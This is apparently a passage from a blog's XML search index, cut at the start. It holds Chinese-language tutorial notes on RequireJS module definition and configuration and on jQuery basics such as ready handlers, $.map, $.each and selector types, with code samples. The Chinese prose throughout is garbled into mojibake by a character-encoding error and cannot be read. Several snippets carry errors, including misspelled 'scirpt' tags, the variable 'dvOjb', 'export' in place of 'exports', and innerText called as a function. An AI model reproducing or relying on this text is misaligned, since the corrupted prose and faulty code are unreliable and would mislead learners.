alert(math.add(1,1));&#125;);//å¦‚æžœè¿™ä¸ªæ¨¡å—è¿˜ä¾èµ–å…¶ä»–æ¨¡å—ï¼Œé‚£ä¹ˆdefineï¼ˆï¼‰å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå°±å¿…é¡»æ˜¯ä¸€ä¸ªæ•°ç»„ï¼ŒæŒ‡æ˜Žè¯¥æ¨¡å—çš„ä¾èµ–æ€§define(['myLib'],function(myLib)&#123; function foo()&#123; myLib.doSomething(); &#125; return &#123; foo : foo &#125;&#125;); å½“require()å‡½æ•°åŠ è½½ä¸Šé¢çš„è¿™ä¸ªæ¨¡å—çš„æ—¶å€™ï¼Œå°±ä¼šå…ˆåŠ è½½myLib.jsæ–‡ä»¶ï¼ˆ6ï¼‰åŠ è½½éžè§„èŒƒçš„æ¨¡å—åœ¨åŠ è½½éžè§„èŒƒçš„æ¨¡å—ä¹‹å‰å…ˆç”¨require.config()å®šä¹‰å®ƒä»¬çš„ä¸€äº›ç‰¹å¾ï¼Œunderscoreä¸Žbackboneè¿™ä¸¤ä¸ªåº“ä¸ºä¾‹å­ã€‚ 1234567891011require.config(&#123; shim: &#123; 'underscore':&#123; export:'_' &#125;, 'backbone':&#123; deps:['underscore','jquery'], exports: 'Backbone' &#125; &#125;,&#125;); require.config()æŽ¥å—ä¸€ä¸ªé…ç½®å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡é™¤äº†pathså±žæ€§ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªshimå±žæ€§ï¼Œä¸“é—¨æ¥é…ç½®ä¸å…¼å®¹çš„æ¨¡å—ï¼Œå…·ä½“æ¥è¯´ï¼Œæ¯ä¸ªæ¨¡å—éƒ½è¦å®šä¹‰exportså€¼ï¼ˆè¾“å‡ºçš„å˜é‡åï¼‰ï¼Œæ¥è¡¨æ˜Žè¿™ä¸ªæ¨¡å—å¤–éƒ¨è°ƒç”¨æ—¶çš„åç§°ï¼Œdepsæ•°ç»„æ¥è¡¨æ˜Žè¯¥æ¨¡å—çš„ä¾èµ–æ€§ã€‚jQueryçš„æ’ä»¶å¯ä»¥è¿™æ ·å®šä¹‰ 123456shim&#123; jquery.srcoll':&#123; deps: ['jquery'], exports: 'jQuery.fn.scroll' &#125;&#125; ï¼ˆ7ï¼‰require.jsæ’ä»¶domreadyæ’ä»¶ï¼Œå¯ä»¥è®©å›žè°ƒå‡½æ•°åœ¨é¡µé¢DOMç»“æž„åŠ è½½å®ŒæˆåŽå†è¿è¡Œ 123require([&apos;domready!&apos;],function(doc)&#123; //called once the Dom is ready&#125;); textå’Œimageæ’ä»¶ï¼Œåˆ™æ˜¯è¿è¡Œrequire.jsåŠ è½½æ–‡æœ¬å’Œå›¾ç‰‡æ–‡ä»¶ 1234define(['text!review.txt','image!cat.jpg'],function(review,cat)&#123; console.log(review); document.body.appendChild(cat);&#125;); å‚è€ƒè‡ªé˜®ä¸€å³°è€å¸ˆæ–‡ç« ]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jqueryå¤ä¹ ï¼ˆè§†é¢‘å¿ƒå¾—ï¼‰]]></title>
    <url>%2F2018-02-22-jqueryReview.html</url>
    <content type="text"><![CDATA[Jqueryçš„ä¸€äº›åŸºç¡€å›žé¡¾å¤ä¹  jqueryå‡½æ•°$(document).ready(fn) / $(fn) window.onload ä¸Ž $(document).ready(fn)çš„åŒºåˆ«1.1 window.onload éœ€è¦ç­‰å¾…é¡µé¢å®Œå…¨åŠ è½½å®Œæ¯•æ‰èƒ½è§¦å‘ï¼Œå³æ‰€æœ‰çš„Domå…ƒç´ åˆ›å»ºå®Œæ¯•ã€å›¾ç‰‡ã€Cssç­‰åŠ è½½å®Œæ¯•åŽæ‰å¯ä»¥è§¦å‘ã€‚ $(document).ready() åªè¦Domå…ƒç´ åŠ è½½å®Œæˆå°±å¯ä»¥è§¦å‘ï¼Œè¿™æ ·å¯ä»¥æä¾›å“åº”é€Ÿåº¦1.2 $(document).ready()å¯ä»¥æ³¨å†Œå¤šæ¬¡äº‹ä»¶å¤„ç†ç¨‹åºï¼Œå¹¶ä¸”æœ€ç»ˆéƒ½ä¼šæ‰§è¡Œè€Œ window.onload æ¯æ¬¡æ³¨å†Œæ–°çš„äº‹ä»¶å¤„ç†ç¨‹åºæ—¶éƒ½ä¼šå°†å‰é¢çš„è¦†ç›–æŽ‰ ä½¿ç”¨jQueryå®žçŽ° window.onload çš„æ•ˆæžœï¼š$(window).load(fn) $.map(array,callback(element,index)) å¯¹äºŽæ•°ç»„ array ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œè°ƒç”¨ callback() å‡½æ•°ï¼Œæœ€ç»ˆè¿”å›žä¸€ä¸ªæ–°çš„æ•°ç»„ï¼ŒåŽŸæ•°ç»„ä¸å˜ Exampleï¼š 123456789var arrInt = [1, 2, 3, 4, 5, 6, 7]; var arrIntNEW = $.map(arrInt, function(element, index)&#123; if (index &gt; 3)&#123; return element * 2; &#125; else &#123; return element; &#125;&#125;);console.log(arrIntNEW); $.each(array,fn) éåŽ†æ•°ç»„ï¼Œé€šè¿‡ return false æ¥é€€å‡ºå¾ªçŽ¯ï¼Œä¸èƒ½ä½¿ç”¨ break æ¥æå‡ºå¾ªçŽ¯ Exampleï¼š 12345678var arrInt = [1, 2, 3, 4, 5, 6, 7]; $.each(arrInt, function(key, value)&#123; if(key == 3)&#123; return false; //è·³å‡ºå¾ªçŽ¯ &#125; //å½“ä½¿ç”¨eachéåŽ†ï¼Œæ™®é€šçš„æ•°ç»„çš„æ—¶å€™ï¼Œç´¢å¼•å°±æ˜¯é”®ï¼Œå€¼å°±æ˜¯å€¼ console.log(key + ' , ' + value);&#125;); $.trim(å­—ç¬¦ä¸²) åŽ»æŽ‰ä¸¤ç«¯ç©ºæ ¼ï¼Œå¯åŠ¨è°ƒè¯•ï¼Œå¯ä»¥F11è¿›åŽ»æºç æŸ¥çœ‹åŽŸç† Exampleï¼š 123var msg = ' hello '; console.log(msg);console.log($.trim(msg)); //åŽ»æŽ‰ä¸¤è¾¹ç©ºæ ¼ jqueryå¯¹è±¡ä¸ŽDomå¯¹è±¡Exampleï¼š 1234567891011121314151617181920212223window.onload = function()&#123; document.getElementById('btn').onclick = function()&#123; //èŽ·å–å±‚å¯¹è±¡ //ä»Žé¡µé¢ä¸Šçš„å…ƒç´ å¯¹è±¡æ‰å«åšdomå¯¹è±¡ï¼Œæ•°å€¼ï¼Œæ—¥æœŸå¯¹è±¡ï¼Œè¿™äº›éƒ½ä¸æ˜¯domå¯¹è±¡ var dvObj = document.getElementById('div1'); dvObj.innerText = 'Hello!'; //å½“ç›´æŽ¥ä½¿ç”¨domå¯¹è±¡çš„æ—¶å€™å­˜åœ¨æµè§ˆå™¨å…¼å®¹æ€§é—®é¢˜ //ä¸ºäº†è§£å†³æµè§ˆå™¨çš„å…¼å®¹æ€§é—®é¢˜ï¼Œæ‰€ä»¥è¿™æ—¶å¯ä»¥æŠŠdomå¯¹è±¡è½¬ä¸ºjQueryå¯¹è±¡ï¼Œç„¶åŽå†æ“ä½œ //æŠŠdomå¯¹è±¡è½¬æ¢ä¸ºjQueryå¯¹è±¡åŽï¼Œå°±å¯ä»¥è°ƒç”¨å¯¹åº”çš„æ‰€æœ‰çš„jQueryå¯¹è±¡çš„æˆå‘˜äº† // Dom -&gt; jQuery var $dvObj = $(dvOjb); $dvObj.text('æ‚¨å¥½ï¼); // jQuery -&gt; Dom (ä¸¤ç§æ–¹æ³•) 1. var domDiv = $dvObj[0]; 2. var domDiv = $dvObj.get(0); domDiv.innerText('æˆ‘çŽ°åœ¨æ˜¯domå¯¹è±¡ä¹¦å†™å‡ºæ¥çš„æ–‡å­—'); //jQueryå¯¹è±¡ï¼š //å¯ä»¥æŠŠdomå¯¹è±¡è£…æ¢ä¸ºjQueryå¯¹è±¡ //ä¹Ÿå¯ä»¥æŠŠjQueryå¯¹è±¡è½¬ä¸ºdomå¯¹è±¡ &#125;&#125; jqueryé€‰æ‹©å™¨ Idé€‰æ‹©å™¨ $(â€œ#idâ€) æ ‡ç­¾é€‰æ‹©å™¨ $(â€œinputâ€); ç±»é€‰æ‹©å™¨ $(â€œ.classâ€); æ ‡ç­¾+ç±»é€‰æ‹©å™¨ $(â€œp.textâ€); ç»„åˆé€‰æ‹©å™¨ $(â€œé€‰æ‹©å™¨1â€,â€é€‰æ‹©å™¨2â€,â€é€‰æ‹©å™¨3â€ï¼Œâ€â€¦â€¦â€); å±‚æ¬¡é€‰æ‹©å™¨ åŽä»£å…ƒç´ é€‰æ‹©å™¨ï¼šä½¿ç”¨ç©ºæ ¼éš”å¼€ \$(â€œé€‰æ‹©å™¨1 é€‰æ‹©å™¨2â€)ï¼Œè¡¨ç¤ºé€‰å–é€‰æ‹©å™¨1ä¸‹æ‰€æœ‰çš„é€‰æ‹©å™¨2 å­å…ƒç´ é€‰æ‹©å™¨ï¼šä½¿ç”¨ &gt; éš”å¼€ \$(â€œé€‰æ‹©å™¨1 &gt; é€‰æ‹©å™¨2â€) ç›¸é‚»å…ƒç´ é€‰æ‹©å™¨ï¼šä½¿ç”¨ + æˆ–è€… ~ `+`ï¼š$(&quot;.a + div&quot;) == $(&quot;.a&quot;).next å¦‚æžœç›¸é‚»çš„ä¸æ˜¯div åˆ™ä¸ä¼šç»§ç»­å‘åŽæ‰¾ `~`ï¼š$(&quot;.a ~ div&quot;) == $(&quot;.a&quot;).nextAll() èŽ·å–ç±»åä¸ºaä¹‹åŽçš„æ‰€æœ‰å…„å¼Ÿdivå…ƒç´  \$(â€œdivâ€).prev(â€œspanâ€); èŽ·å–divä¸Šä¸€ä¸ªå…„å¼Ÿå…ƒç´ ï¼Œå¹¶ä¸”è¯¥å…ƒç´ å¿…é¡»æ˜¯span \$(â€œdivâ€).prevAll(â€œspanâ€); èŽ·å–divå‰é¢çš„æ‰€æœ‰spanå…„å¼Ÿå…ƒç´  \$(â€œdivâ€).siblings(â€œspanâ€); èŽ·å–divçš„æ‰€æœ‰spanå…„å¼Ÿå…ƒç´  ç‰¹ç‚¹ï¼šé“¾å¼æ–¹ç¨‹/éšå¼è¿­ä»£ Example1: 1234567$(function()&#123; $("#bthSetText").click(function()&#123; $("p").text("æˆ‘è¢«æ”¹å˜äº†").css("background","#ff9").mouseover(function()&#123; $(this).css("background","#ff9").siblings().css("background",""); &#125;); &#125;);&#125;); Example2: 12345678910111213141516171819202122&lt;ul id="target"&gt;&lt;li&gt;å…¬ç‰›&lt;/li&gt;&lt;li&gt;å°ç‰›&lt;/li&gt;&lt;li&gt;ç‰›å¥¶&lt;/li&gt;&lt;li&gt;æ¯ç‰›&lt;/li&gt;&lt;/ul&gt;&lt;scirpt&gt;$(function()&#123; $("#target li").mouseover(function() &#123; //é¼ æ ‡æ‚¬æµ®äº‹ä»¶ $(this).css("background","#ff9").siblings('li').css("background",""); &#125;).click(function()&#123; //å•å‡»äº‹ä»¶ //æœ‰äº›æ–¹æ³•ä¼šç ´åé“¾å¼ç¼–ç¨‹ä¸­è¿”å›žçš„å¯¹è±¡ï¼Œæ¯”å¦‚ï¼š next(),nextAll(),prev(),prevAll(),siblings() //æ— å‚æ•°çš„ï¼štext()ã€val()ã€html() //å½“é“¾å¼ç¼–ç¨‹çš„é“¾è¢«ç ´åæ—¶å¯ä»¥ç”¨end()ä¿®å¤ $(this).prevAll().css("background","green").end().nextAll().css("background","blue");&#125;);&#125;);&lt;/scirpt&gt; jQuery1.6ä»¥åŽæœ‰ä»¥ä¸‹åŒºåˆ«ï¼Œ1.6ä¹‹å‰éƒ½æ˜¯ç”¨attr attr() ä¸Ž prop()å¯¹äºŽHTMLå…ƒç´ æœ¬èº«å°±å¸¦æœ‰çš„ å›ºæœ‰ å±žæ€§ï¼Œåœ¨å¤„ç†æ—¶ï¼Œä½¿ç”¨ prop æ–¹æ³•ã€‚å¯¹äºŽHTMLå…ƒç´ æˆ‘ä»¬è‡ªå·± è‡ªå®šä¹‰ çš„DOMå±žæ€§ï¼Œåœ¨å¤„ç†æ—¶ï¼Œä½¿ç”¨ attr æ–¹æ³•ã€‚ è¿‡æ»¤é€‰æ‹©å™¨ï¼ˆ:ï¼‰:first é€‰å– ç¬¬ä¸€ä¸ª å…ƒç´  $(&quot;div:first&quot;):last é€‰å– æœ€åŽä¸€ä¸ª å…ƒç´  $(&quot;div:last&quot;):not(é€‰æ‹©å™¨)é€‰å– ä¸æ»¡è¶³é€‰æ‹©å™¨ æ¡ä»¶çš„å…ƒç´  $(&quot;input:not(.myClass)&quot;):even \ :odd é€‰å–ç´¢å¼•æ˜¯ å¶æ•° ã€å¥‡æ•° çš„å…ƒç´  $(&quot;input:even&quot;):eq(ç´¢å¼•åºå·) \ ï¼šgt(ç´¢å¼•åºå·) \ :lt(ç´¢å¼•åºå·) é€‰å–ç´¢å¼• ç­‰äºŽ ã€å¤§äºŽ ã€å°äºŽ ç´¢å¼•å·çš„å…ƒç´  $(&quot;input:lt(5)&quot;) | $(&quot;input:lt(3):gt(0)&quot;):animated é€‰å–æ­£åœ¨ æ‰§è¡ŒåŠ¨ç”» çš„ div å…ƒç´ $(&quot;.header&quot;) é€‰å–æ‰€æœ‰ h1â€¦h6 å…ƒç´  Example1: 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;input type="button" name="" id="btn" value="ç‚¹æˆ‘"&gt;&lt;table id="t" border="1"&gt; &lt;tr&gt; &lt;td&gt;å§“å&lt;/td&gt; &lt;td&gt;æˆç»©&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;a&lt;/td&gt; &lt;td&gt;100&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;b&lt;/td&gt; &lt;td&gt;99&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;c&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;d&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;e&lt;/td&gt; &lt;td&gt;98&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;f&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;å¹³å‡åˆ†&lt;/td&gt; &lt;td&gt;97&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;script&gt; $(function()&#123; $("#btn").click(function()&#123; $("#t tr:first").css("font-size","70px"); $("#t tr:gt(0):lt(3)").css("font-size","28px"); $("#t tr:last").css("color","red"); $("#t tr:odd:not(:last)").css("background","red"); &#125;); &#125;);&lt;/script&gt; Example2: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;table id="b1" border="1" cellpadding="2" cellspacing="2"&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;td&gt;Aa&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt;&lt;script&gt; $(function()&#123; $("#b1 tr").click(function() &#123; $("td").css("background",""); $("td:even",$(this)).css("background","red"); //$(this) == $("#b1 tr") $("td:odd",$(this)).css("background","blue"); &#125;); &#125;);&lt;/script&gt; $(â€œtd:evenâ€,$(this)) è¡¨ç¤ºåœ¨ä¸Šæ–‡é¼ æ ‡æ‰€ç‚¹å‡»çš„ tr é‡Œé¢æ¥é€‰æ‹© td å±žæ€§è¿‡æ»¤é€‰æ‹©å™¨$(&quot;div[id]&quot;) é€‰å–æœ‰ id å±žæ€§çš„ &lt;div&gt;$(&quot;div[title=test]&quot;) é€‰å– title å±žæ€§ä¸ºtestçš„ &lt;div&gt;$(&quot;div[title!=test]&quot;) é€‰å– title å±žæ€§ä¸ä¸ºtestçš„ &lt;div&gt;Example1: 1234567891011121314151617181920212223242526&lt;input type="text" name="a1"&gt;&lt;input type="text" name="a2"&gt;&lt;input type="text" name="a3"&gt;&lt;input type="text" name="a4"&gt;&lt;input type="text" name="a5"&gt;&lt;input type="text" name="a6"&gt;&lt;input type="text" name="a7"&gt;&lt;input type="text" name="a8"&gt;&lt;script&gt; //1.é€‰å–æ‰€æœ‰inputå±žæ€§ï¼Œå…·æœ‰nameå±žæ€§çš„ $("input[name]").css(); //2.é€‰å–æ‰€æœ‰bodyä¸‹é¢å…·æœ‰nameå±žæ€§çš„å…ƒç´  $("body *[name]").css(); //3.é€‰å–é¡µé¢ä¸Šå…·æœ‰nameå±žæ€§ï¼ŒåŒæ—¶nameå±žæ€§çš„å¼€å¤´ä¸ºaçš„å…ƒç´  $("body *[name^=a]").css(); //4.é€‰å–nameå±žæ€§ä¸ºç©ºçš„ $("body *[name=]").css(); //5.é€‰å–ä»¥nameå±žæ€§ä¸­aç»“å°¾çš„ $("body *[name$=a]").css(); //6.åŒ…å«açš„nameçš„å±žæ€§çš„å…ƒç´  $("body *[name*=a]").css(); //7.nameå±žæ€§ä¸­ä¸ç­‰äºŽæŸä¸ªå±žæ€§çš„ $("body *[name!='spec']").css(); //8.åŒæ—¶å…·æœ‰å¤šä¸ªå±žæ€§çš„ $("body *[name*=a] [id] [value]").css();&lt;/script&gt; è¡¨å•é€‰æ‹©å™¨$(&quot;:input&quot;) é€‰å–æ‰€æœ‰&lt;input&gt;ã€&lt;textarea&gt;ã€&lt;select&gt; å’Œ &lt;button&gt;$(&quot;input&quot;) ä¸ä¸€æ ·ï¼ŒåªèŽ·å¾— &lt;input&gt;$(&quot;:text&quot;) == $(&quot;input[type=text]&quot;) é€‰å–æ‰€æœ‰çš„å•è¡Œæ–‡æœ¬æ¡†$(&quot;:password&quot;); é€‰å–æ‰€æœ‰å¯†ç æ¡†ä¸Šè¿°åŒç†çš„è¿˜æœ‰ :radioã€:submitã€:imageã€:resetã€:buttonã€:fileã€:hidden ï¼ˆæ›¿ä»£äº†$(&quot;input[type=***]&quot;)ï¼‰ è¡¨å•å¯¹è±¡å±žæ€§è¿‡æ»¤é€‰æ‹©å™¨$(&quot;#form :enabled&quot;) é€‰å–idä¸ºformçš„è¡¨å•å†…æ‰€æœ‰ å¯ç”¨ çš„å…ƒç´ $(&quot;#form :disabled&quot;) é€‰å–idä¸ºformçš„è¡¨å•å†…æ‰€æœ‰ ç¦ç”¨ çš„å…ƒç´ $(&quot;#input:checked&quot;) é€‰å–æ‰€æœ‰ é€‰ä¸­ çš„å…ƒç´ (Radio/Checkbox),ä¸­é—´ä¸å¯æœ‰ç©ºæ ¼$(&quot;select :selected&quot;) é€‰å–æ‰€æœ‰é€‰ä¸­çš„ é€‰é¡¹ çš„å…ƒç´ (ä¸‹æ‹‰åˆ—è¡¨)]]></content>
      <categories>
        <category>jQueryç›¸å…³</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
</search>
